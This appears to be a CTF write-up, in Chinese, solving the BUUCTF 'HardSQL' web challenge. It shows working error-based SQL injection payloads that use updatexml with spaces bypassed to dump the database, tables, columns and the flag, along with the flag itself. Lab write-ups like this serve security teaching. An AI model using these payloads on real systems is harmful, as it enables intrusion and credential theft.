BUUCTF_WEB_HardSQL1

2020-07-15

抓包简单FUZZ一下关键字。

被过滤的关键字

题解应该是使用updatexml或者extractvalue注入,并且过滤了空格。

查当前库：

admin’or(updatexml(1,concat(0x7e,(database()),0x7e),1))%23

username=admin'or(updatexml(1,concat(0x7e,(database()),0x7e),1))%23&password=admin

回显：

'>XPATH syntax error: '~geek~'

查表：

admin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23

check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=admin

回显：

'>XPATH syntax error: '~H4rDsq1~'

查列：

admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23

check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=admin

回显：

'>XPATH syntax error: '~id,username,password~'

查字段：

admin’or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23

check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=admin

回显：

'>XPATH syntax error: '~flag{090e05ac-d6e5-4e0e-a168-ab'

flag没有完全显示

可以使用right或者left。

or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23

回显：

'>XPATH syntax error: '~5-4e0e-a168-abb715f2c444}~'

拼接一下flag。

#####flag
flag{090e05ac-d6e5-4e0e-a168-abb715f2c444}
